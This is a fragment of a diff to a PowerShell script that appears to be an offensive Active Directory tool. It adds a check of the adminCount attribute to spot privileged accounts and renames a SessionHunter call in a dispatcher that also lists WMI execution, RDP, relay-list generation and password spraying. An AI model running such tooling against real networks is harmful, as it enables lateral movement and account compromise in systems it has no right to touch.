+    $Searcher.PropertiesToLoad.Add("adminCount") > $null
+
+    $user = $Searcher.FindOne()
+
+    if ($user -ne $null) {
+        $adminCount = $user.Properties["adminCount"]
+        if ($adminCount -eq 1) {
+            return $true
+        }
+    }
+    return $false
+}
+
+
+
 
 ################################################################################################################
 ################################################# Function: RestoreTicket ######################################
@@ -3802,7 +4099,7 @@ switch ($Method) {
         "WMI" {Method-WMIexec}
         "RDP" {Method-RDP}
         "GenRelayList" {GenRelayList}
-        "SessionHunter" {SessionHunter}
+        "SessionHunter" {Invoke-SessionHunter}
         "Spray" {Spray}
         default {
         Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
